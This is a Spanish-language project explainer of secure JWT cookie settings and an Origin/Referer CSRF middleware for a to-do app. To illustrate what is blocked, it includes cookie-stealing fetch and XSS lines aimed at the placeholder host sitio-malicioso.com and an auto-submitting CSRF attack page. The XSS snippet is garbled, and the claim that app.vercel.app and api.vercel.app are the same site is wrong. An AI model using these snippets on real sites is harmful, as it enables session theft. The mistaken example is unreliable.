# Explicación: Configuración de Cookies Seguras (JWT)

## Código actual en el proyecto

```javascript
// backend/src/utils/jwt.js (líneas 12-20)
const cookieOptions = {
  expires: new Date(
    Date.now() +
      (parseInt(process.env.JWT_COOKIE_EXPIRES_IN) || 7) * 24 * 60 * 60 * 1000
  ),
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "strict",
};
```

---

## 🔐 Explicación de cada propiedad

### 1. `expires` - Fecha de Expiración

```javascript
expires: new Date(
  Date.now() +
    (parseInt(process.env.JWT_COOKIE_EXPIRES_IN) || 7) * 24 * 60 * 60 * 1000
);
```

**¿Qué hace?**

- Define cuándo la cookie dejará de ser válida y el navegador la eliminará automáticamente

**Desglose del cálculo:**

- `Date.now()` → Fecha/hora actual en milisegundos
- `parseInt(process.env.JWT_COOKIE_EXPIRES_IN) || 7` → Días de validez (7 por defecto)
- `24 * 60 * 60 * 1000` → Conversión de días a milisegundos
  - 24 horas × 60 minutos × 60 segundos × 1000 milisegundos

**Ejemplo:**

```javascript
// Si JWT_COOKIE_EXPIRES_IN = 7
// La cookie expira en 7 días desde que se crea
```

**¿Por qué es importante?**

- ✅ Limita el tiempo que alguien puede usar una sesión robada
- ✅ Obliga a los usuarios a re-autenticarse periódicamente
- ✅ Reduce el riesgo de sesiones "olvidadas" abiertas

---

### 2. `httpOnly: true` - Protección contra XSS

**¿Qué hace?**

- Impide que JavaScript acceda a la cookie
- La cookie SOLO puede ser leída por el servidor

**Ejemplo de ataque bloqueado:**

```javascript
// ❌ Esto NO funciona con httpOnly: true
console.log(document.cookie); // No muestra la cookie JWT

// Un atacante intenta robar la cookie con código malicioso:
fetch("https://sitio-malicioso.com/robar", {
  method: "POST",
  body: document.cookie, // ❌ No puede acceder a la cookie
});
```

**Sin httpOnly (PELIGROSO):**

```javascript
// ⚠️ Con httpOnly: false
console.log(document.cookie); // ✅ Muestra: "jwt=eyJhbGc..."

// Un atacante inyecta este script en tu sitio (ataque XSS):
<script>
  // ✅ Puede robar la cookie fetch('https://sitio-malicioso.com/robar?cookie='
  + document.cookie);
</script>;
```

**¿Por qué es importante?**

- ✅ Protege contra ataques XSS (Cross-Site Scripting)
- ✅ Aunque un atacante inyecte código JavaScript malicioso, no puede leer el JWT
- ✅ **SIEMPRE debe ser `true` para tokens de autenticación**

---

### 3. `secure: process.env.NODE_ENV === 'production'` - Solo HTTPS

**¿Qué hace?**

- En producción (`true`): La cookie SOLO se envía por conexiones HTTPS
- En desarrollo (`false`): Permite HTTP (porque localhost usa HTTP)

**Ejemplo:**

**En Producción (HTTPS):**

```
https://www.mi-todos.com/api/login
✅ Cookie enviada (conexión segura)

http://www.mi-todos.com/api/login
❌ Cookie NO enviada (conexión insegura)
```

**En Desarrollo (HTTP):**

```
http://localhost:3000/api/login
✅ Cookie enviada (permitido en desarrollo)
```

**¿Por qué es importante?**

- ✅ Previene que la cookie sea interceptada en redes WiFi públicas
- ✅ Protege contra ataques "Man-in-the-Middle"

**Ejemplo de ataque bloqueado:**

```
Usuario en Starbucks WiFi:
┌─────────────┐      ┌──────────────┐      ┌─────────────┐
│   Usuario   │─────▶│  Atacante    │─────▶│   Servidor  │
│  (Browser)  │      │  (Sniffing)  │      │             │
└─────────────┘      └──────────────┘      └─────────────┘

Con HTTP:  ⚠️ Atacante puede ver el JWT
Con HTTPS: ✅ Tráfico encriptado, atacante no ve nada
```

---

### 4. `sameSite: 'strict'` - Protección contra CSRF

**¿Qué hace?**

- Controla cuándo el navegador envía la cookie en peticiones desde otros sitios
- Protege contra ataques CSRF (Cross-Site Request Forgery)

---

## Valores posibles de `sameSite`:

### Opción 1: `'strict'` ✋ (Configuración actual)

**Comportamiento:**

- La cookie SOLO se envía en peticiones que se originan desde el mismo sitio

**Ejemplo A - Dentro de tu app:**

```
Usuario en: www.mi-todos.com/dashboard
Hace clic: "Mis tareas" → www.mi-todos.com/tasks
✅ Cookie enviada → Usuario sigue autenticado
```

**Ejemplo B - Link desde email:**

```
Gmail: "Tienes nuevas tareas pendientes"
Usuario hace clic → www.mi-todos.com/tasks
❌ Cookie NO enviada en la primera petición
⚠️ Usuario aparece como NO autenticado
→ Debe refrescar o navegar dentro del sitio
```

**Ejemplo C - Ataque CSRF bloqueado:**

```html
<!-- Sitio malicioso: www.sitio-malo.com -->
<form action="https://www.mi-todos.com/api/todos/123" method="POST">
  <input type="hidden" name="completed" value="true" />
</form>
<script>
  document.forms[0].submit(); // Intenta marcar tarea como completada
</script>

Resultado: ❌ Cookie NO enviada → Ataque bloqueado
```

---

### Opción 2: `'lax'` 👍 (Recomendado para mejor UX)

**Comportamiento:**

- Cookie se envía en navegaciones normales (GET)
- NO se envía en POST/PUT/DELETE desde otros sitios

**Ejemplo A - Dentro de tu app:**

```
✅ Cookie enviada (igual que strict)
```

**Ejemplo B - Link desde email:**

```
Gmail: "Tienes nuevas tareas pendientes"
Usuario hace clic → www.mi-todos.com/tasks
✅ Cookie SÍ enviada (solo en GET)
✅ Usuario aparece autenticado inmediatamente
```

**Ejemplo C - Ataque CSRF bloqueado:**

```html
<!-- POST/DELETE desde otro sitio -->
❌ Cookie NO enviada → Ataque bloqueado
```

---

### Opción 3: `'none'` + Protección CSRF ✅ (IMPLEMENTADO)

**Comportamiento:**

- Cookie SIEMPRE se envía, incluso desde otros dominios
- **Requiere `secure: true` obligatoriamente** (solo HTTPS)

**Cuándo usarlo:**

- ✅ **Aplicación con frontend y backend en diferentes dominios** (Vercel + Render)
- ✅ **Con protección CSRF adicional mediante verificación de Origin/Referer**

**Implementación en este proyecto:**

```javascript
// Backend: jwt.js
const cookieOptions = {
  expires: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'strict',
};
```

**Protección CSRF implementada:**

```javascript
// Backend: middlewares/csrfProtection.js
export const csrfProtection = (req, res, next) => {
  const safeMethods = ['GET', 'HEAD', 'OPTIONS'];
  if (safeMethods.includes(req.method)) return next();

  const origin = req.get('origin');
  const referer = req.get('referer');
  const allowedOrigins = [
    process.env.CORS_ORIGIN,
    process.env.FRONTEND_URL,
  ].filter(Boolean);

  // Verificar Origin (preferido)
  if (origin && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ message: 'Forbidden - Invalid origin' });
  }

  // Verificar Referer (backup)
  if (!origin && referer) {
    const refererDomain = new URL(referer).origin;
    if (!allowedOrigins.includes(refererDomain)) {
      return res.status(403).json({ message: 'Forbidden - Invalid referer' });
    }
  }

  // Sin origin ni referer = bloquear
  if (!origin && !referer) {
    return res.status(403).json({ message: 'Forbidden - Missing headers' });
  }

  next();
};
```

**Activación solo en producción:**
```javascript
// server.js
if (process.env.NODE_ENV === 'production') {
  app.use(csrfProtection);
}
```

---

## 🔍 Diferencia entre Origin y Site

Es importante entender la diferencia entre **"origin"** y **"site"** para comprender cómo funciona `sameSite`:

### Origin (Origen)
- **Origin** = protocolo + dominio + puerto
- Ejemplos:
  - `http://localhost:3000` ≠ `http://localhost:5000` (**diferentes origins**)
  - `https://app.vercel.app` ≠ `https://api.vercel.app` (**diferentes origins**)

### Site (Sitio)
- **Site** = dominio registrable (eTLD+1) **sin considerar el puerto**
- Ejemplos:
  - `localhost:3000` y `localhost:5000` = **mismo site** (`localhost`)
  - `app.vercel.app` y `api.vercel.app` = **mismo site** (`vercel.app`)
  - `tu-app.vercel.app` y `tu-backend.onrender.com` = **diferentes sites**

### Aplicación práctica en este proyecto:

**Desarrollo (`sameSite: 'strict'` funciona ✅):**
```
Frontend: http://localhost:3000
Backend:  http://localhost:5000

❌ Diferentes ORIGINS (por eso necesitas CORS)
✅ Mismo SITE (localhost)
→ sameSite: 'strict' SÍ funciona
```

**Producción (`sameSite: 'strict'` NO funciona ❌):**
```
Frontend: https://tu-app.vercel.app
Backend:  https://tu-backend.onrender.com

❌ Diferentes ORIGINS
❌ Diferentes SITES (vercel.app ≠ onrender.com)
→ sameSite: 'strict' NO funciona
→ Necesitas sameSite: 'none'
```

**Conclusión:** Por eso en desarrollo funciona `sameSite: 'strict'` aunque estés en diferentes puertos, pero en producción con diferentes dominios necesitas `sameSite: 'none'` + protección CSRF.

---

## 📊 Comparación de `sameSite`

| Situación                                | `strict` | `lax` | `none` (sin protección) | `none` + CSRF middleware ✅ |
| ---------------------------------------- | -------- | ----- | ----------------------- | --------------------------- |
| Navegación dentro del sitio              | ✅       | ✅    | ✅                      | ✅                          |
| Links desde email/redes sociales         | ❌       | ✅    | ✅                      | ✅                          |
| POST desde otros sitios legítimos        | ❌       | ❌    | ✅                      | ✅                          |
| POST desde sitios maliciosos (CSRF)      | ❌       | ❌    | ✅ ⚠️                   | ❌ ✅                       |
| Frontend y backend en diferentes dominios| ❌       | ❌    | ✅                      | ✅                          |
| Protección CSRF                          | ⭐⭐⭐   | ⭐⭐  | ❌                      | ⭐⭐⭐                       |
| Experiencia de usuario                   | ⚠️       | ✅    | ✅                      | ✅                          |
| **Usado en este proyecto**               | Dev      | -     | -                       | **Producción** ✅           |

---

## 🎯 Ejemplo completo de ataque CSRF

### Escenario:

Juan está logueado en `www.mi-todos.com` y visita un sitio malicioso.

```html
<!-- www.sitio-malicioso.com -->
<!DOCTYPE html>
<html>
  <head>
    <title>Gana un iPhone 😱</title>
  </head>
  <body>
    <h1>¡Felicidades! Haz clic para reclamar tu premio</h1>

    <!-- Formulario oculto que hace una petición maliciosa -->
    <form
      id="malicious"
      action="https://www.mi-todos.com/api/todos"
      method="POST"
    >
      <input type="hidden" name="title" value="Transferir dinero a atacante" />
      <input type="hidden" name="completed" value="false" />
    </form>

    <script>
      // Se ejecuta automáticamente cuando Juan entra
      document.getElementById("malicious").submit();
    </script>
  </body>
</html>
```

**Resultado según configuración:**

| Configuración                  | Resultado                                                   |
| ------------------------------ | ----------------------------------------------------------- |
| `sameSite: 'strict'`           | ✅ Cookie NO enviada → Petición falla (401 Unauthorized)    |
| `sameSite: 'lax'`              | ✅ Cookie NO enviada en POST → Petición falla               |
| `sameSite: 'none'` (sin CSRF)  | ❌ Cookie enviada → ¡Tarea creada! 😱                       |
| `sameSite: 'none'` + **CSRF**  | ✅ Cookie enviada PERO middleware bloquea origen inválido → 403 Forbidden |

**En este proyecto (Producción):**
- La cookie SÍ se envía (`sameSite: 'none'`)
- PERO el middleware CSRF verifica que `Origin: https://sitio-malicioso.com`
- NO está en `allowedOrigins` → **Petición bloqueada con 403** ✅

---

## ✅ Configuración Recomendada

### Para aplicaciones con frontend y backend en MISMO dominio:

```javascript
const cookieOptions = {
  expires: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 días
  httpOnly: true, // Protección XSS
  secure: process.env.NODE_ENV === "production", // Solo HTTPS en prod
  sameSite: "lax", // Balance CSRF/UX
};
```

### Para aplicaciones con frontend y backend en DIFERENTES dominios (Vercel + Render):

```javascript
// ✅ CONFIGURACIÓN IMPLEMENTADA EN ESTE PROYECTO
const cookieOptions = {
  expires: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: process.env.NODE_ENV === "production" ? "none" : "strict",
};

// + Middleware CSRF obligatorio en server.js
if (process.env.NODE_ENV === 'production') {
  app.use(csrfProtection);
}
```

### Para máxima seguridad (aplicaciones bancarias, mismo dominio):

```javascript
const cookieOptions = {
  expires: new Date(Date.now() + 1 * 24 * 60 * 60 * 1000), // 1 día solamente
  httpOnly: true, // Protección XSS
  secure: true, // SIEMPRE HTTPS
  sameSite: "strict", // Máxima protección CSRF
};
```

---

## 🔍 Resumen de seguridad

| Propiedad                  | Protege contra                     | ¿Obligatorio?         |
| -------------------------- | ---------------------------------- | --------------------- |
| `httpOnly: true`           | Ataques XSS                        | ✅ SÍ                 |
| `secure: true`             | Man-in-the-Middle                  | ✅ SÍ (en producción) |
| `sameSite: 'lax'/'strict'` | Ataques CSRF                       | ✅ SÍ                 |
| `expires`                  | Sesiones robadas de larga duración | ✅ SÍ                 |

---

## 📚 Recursos adicionales

- [MDN - Cookies](https://developer.mozilla.org/es/docs/Web/HTTP/Cookies)
- [MDN - SameSite](https://developer.mozilla.org/es/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [OWASP - Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP - CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
